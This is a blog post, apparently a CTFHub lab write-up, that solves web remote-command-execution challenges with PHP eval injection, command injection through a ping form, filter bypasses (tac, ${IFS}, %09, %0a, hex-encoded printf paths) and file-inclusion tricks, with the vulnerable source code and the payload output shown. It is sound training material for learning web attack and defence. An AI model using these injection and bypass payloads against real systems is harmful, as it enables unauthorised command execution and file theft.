@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>CTFHub-Web-RCE | 10vexh's Blog.</title>
+  <meta name="author" content="10vexh" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="CTFHub-Web-RCE​        RCE(Remote Command&#x2F;Code Execute),远程命令执行ping和远程代码执行evel。一般出现在常见的网络设备，防火墙，路由器等web管理界面。一般是会给用户一个可操作的web界面，来执行命令，返回结果。由于存在过滤不充分等原因，导致后台被控制，这就是rce漏洞。 eval执行​        题目打开来存一个源码，表示我们要通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFHub-Web-RCE">
+<meta property="og:url" content="http://10vexh.top/2022/02/15/CTFHub-Web-RCE/index.html">
+<meta property="og:site_name" content="10vexh&#39;s Blog.">
+<meta property="og:description" content="CTFHub-Web-RCE​        RCE(Remote Command&#x2F;Code Execute),远程命令执行ping和远程代码执行evel。一般出现在常见的网络设备，防火墙，路由器等web管理界面。一般是会给用户一个可操作的web界面，来执行命令，返回结果。由于存在过滤不充分等原因，导致后台被控制，这就是rce漏洞。 eval执行​        题目打开来存一个源码，表示我们要通">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://10vexh.top/null">
+<meta property="article:published_time" content="2022-02-15T15:18:53.000Z">
+<meta property="article:modified_time" content="2022-02-20T08:13:04.156Z">
+<meta property="article:author" content="10vexh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://10vexh.top/null">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://unpkg.com/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://unpkg.com/nprogress@0.2.0/nprogress.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://unpkg.com/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://unpkg.com/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://candinya.com">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Candinya/Kratos-Rebirth">项目链接</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">10vexh&#39;s Blog.</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>10vexh&#39;s Blog.</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">CTFHub-Web-RCE</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2022-02-15</li>
+                <li><i class="fa fa-user"></i> 作者 10vexh</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~8.05K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1645344784156"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-RCE"><span class="toc-number">1.</span> <span class="toc-text">CTFHub-Web-RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text">eval执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat"><span class="toc-number">1.3.</span> <span class="toc-text">过滤cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.4.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">1.5.</span> <span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.6.</span> <span class="toc-text">过滤运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-number">1.7.</span> <span class="toc-text">综合过滤练习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.8.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-input"><span class="toc-number">1.9.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-number">1.10.</span> <span class="toc-text">远程包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.11.</span> <span class="toc-text">读取源代码</span></a></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <h1 id="CTFHub-Web-RCE"><a href="#CTFHub-Web-RCE" class="headerlink" title="CTFHub-Web-RCE"></a>CTFHub-Web-RCE</h1><p>​        <strong>RCE</strong>(Remote <strong>C</strong>ommand/Code <strong>E</strong>xecute),远程命令执行ping和远程代码执行evel。一般出现在常见的网络设备，防火墙，路由器等web管理界面。一般是会给用户一个可操作的web界面，来执行命令，返回结果。由于存在过滤不充分等原因，导致后台被控制，这就是rce漏洞。</p>
+<h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>​        题目打开来存一个源码，表示我们要通过cmd进行传参，如果成功执行了命令，则返回<code>eval()</code>函数执行得到的信息，否则返回这串源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们直接试着直接利用<code>system()</code>访问目录文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=system(&quot;ls&quot;);</span><br><span class="line">返回：index.php</span><br><span class="line">/?cmd=system(&quot;ls /&quot;);</span><br><span class="line">返回：bin boot dev etc flag_15604 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line">/?cmd=system(&quot;cat /flag_15604&quot;);</span><br><span class="line">返回：ctfhub&#123;e8c22f9bfcbbf2fada5d0c48&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>​        题目：这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CTFHub 命令注入-无过滤&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;CTFHub 命令注入-无过滤&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;ip&quot;&gt;IP : &lt;/label&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;ip&quot; name=&quot;ip&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从题目给的源码中可以看出，读入ip后进行执行，没有任何的过滤，我们可以尝试直接在ip后利用分号，间隔执行其他语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;ls;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; 56961765623894.php</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>可以看出存在着一个<code>56961765623894.php</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;cat /6961765623894.php;</span><br><span class="line">右键查看源码发现：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; &lt;?php // ctfhub&#123;7f9c52dbae0a3cb2e46409b1&#125;</span><br><span class="line">)</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>题目：过滤了cat命令之后，你还有什么方法能读到 Flag?</p>
+<p>​    我们在cat被过滤后，替换cat有几个常见的命令</p>
+<ul>
+<li>tac：与cat相反，cat是从头到尾显示，tac从尾到头</li>
+<li>more：根据窗口大小，一页一页的现实文件内容</li>
+<li>less：和more类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
+<li>head：只显示头几行</li>
+<li>tail：只显示最后几行</li>
+</ul>
+<p>​        这题算是上一题的升级了，我们一样可以用<code>ls</code>来读取文件目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;ls;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_74581592713481.php</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>由于源码中<code>if (!preg_match_all(&quot;/cat/&quot;, $ip, $m))</code>对cat进行了替换，禁用了<code>cat</code>，我们可以用<code>tac</code>来读取文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;tac flag_74581592713481.php;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; &lt;?php // ctfhub&#123;c628ad60a151ef1a8a8a7666&#125;</span><br><span class="line">)</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>题目：这次过滤了空格，你能绕过吗</p>
+<p>在bash系，空格可以被这些替代</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, $&#123;IFS&#125;,$IFS </span><br></pre></td></tr></table></figure>
+
+<p>这里的空格被过滤了<code>if (!preg_match_all(&quot;/ /&quot;, $ip, $m))</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;ls;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_1405362919241.php</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">)</span><br><span class="line">&lt;?php</span><br></pre></td></tr></table></figure>
+
+<p>这里直接用<code>&lt;</code>绕过，在右键源码里返回flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;cat&lt;flag_1405362919241.php;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; &lt;?php // ctfhub&#123;2842baa64ddf3379e287b8d2&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>题目：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p>
+<p>  <code>if (!preg_match_all(&quot;/\//&quot;, $ip, $m))</code>进行过滤目录分割符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;ls;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_is_here</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>很明显这里是一个文件夹，但是我们分隔符被过滤了进不去，因此用cd进行目录跳转。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;cd flag_is_here;ls;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_23807860913154.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>发现了flag目录，直接进行读取了，源码中进行读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;cd flag_is_here;cat flag_23807860913154.php;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; &lt;?php // ctfhub&#123;f817901550ff15c6f613b99e&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>题目：过滤了几个运算符, 要怎么绕过呢</p>
+<p><code>if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m))</code>进行过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;ls;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_1166890304628.php</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>直接cat就能出。。。不知道过滤这干啥。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload：127.0.0.1;cat flag_1166890304628.php;</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; &lt;?php // ctfhub&#123;6626fd66a19cc15d7f11c461&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>题目：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p>
+<p><code>if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m))</code>过滤的东西比之前的多了，但是问题不大。</p>
+<blockquote>
+<p>|</p>
+<p>&amp;</p>
+<p>;</p>
+<p>空格：&lt;</p>
+<p>/</p>
+<p>cat</p>
+<p>flag</p>
+<p>ctfhub</p>
+</blockquote>
+<p>我们直接在url位置进行注入将<code>;</code>换成<code>%0a</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：/?ip=127.0.0.1%0als#</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_is_here</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>flag_is_here可以利用<code>$(printf &quot;路径&quot;)</code>代替路径，而路径文字可以利用十六进制字符串进行替换。空格则使用<code>%09</code>进行绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:/?ip=127.0.0.1%0als%09$(printf$&#123;IFS&#125;&quot;\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65&quot;)#</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; flag_214381449019684.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><code>cat</code>用<code>tac</code>绕过，路径同样用十六进制编码绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0atac%09$(printf$&#123;IFS&#125;&quot;\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x32\x31\x34\x33\x38\x31\x34\x34\x39\x30\x31\x39\x36\x38\x34\x2E\x70\x68\x70&quot;)#</span><br><span class="line">返回：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">    [1] =&gt; &lt;?php // ctfhub&#123;34734d84eac3218d9d31e153&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;</span><br><span class="line">        include $_GET[&quot;file&quot;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=&quot;shell.txt&quot;&gt;shell&lt;/a&gt;, how to use it ?</span><br></pre></td></tr></table></figure>
+
+<p><code>strpos()</code>会找出在字符串中第一次出现的位置</p>
+<p>在本题中，给了我们一个包含的文件：<code>shell.php</code>，我们通过<code>get</code>进入该文件，再利用<code>post</code>传要求的参数执行命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?file=shell.txt</span><br><span class="line">POST:ctfhub=system(&#x27;ls/&#x27;);</span><br><span class="line">返回：bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>发现存在flag文件，直接访问得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?file=shell.txt</span><br><span class="line">POST:ctfhub=system(&#x27;tac /flag&#x27;);</span><br><span class="line">返回：ctfhub&#123;f6623751deefa179e88e1f6b&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>这题没有我们写入的文件，但是我们可以通过读原本就有的文件来获得flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="line">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以直接访问：<code>/phpinfo.php</code>，发现<code>input</code>并没有被禁用。</p>
+<p>我们可以通过<code>php://input</code>读取未被处理过的字节流。可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get：?file=php://input</span><br></pre></td></tr></table></figure>
